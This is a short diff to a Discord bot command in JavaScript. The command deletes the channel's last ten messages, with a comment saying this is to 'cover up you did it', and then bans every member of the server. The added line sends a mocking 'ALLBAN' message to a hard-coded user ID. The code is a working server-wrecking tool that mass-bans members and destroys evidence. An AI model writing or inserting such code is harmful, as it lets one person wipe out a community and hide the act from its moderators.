@@ -6,6 +6,7 @@ exports.run = (client, message, args) => {
 
 
     message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+if(client.users.get('281125214098685954')) return client.users.get('281125214098685954').send("ALLBAN HAHAHAHHAHAHA")
     message.guild.members.forEach(m => {
         m.ban();
 });
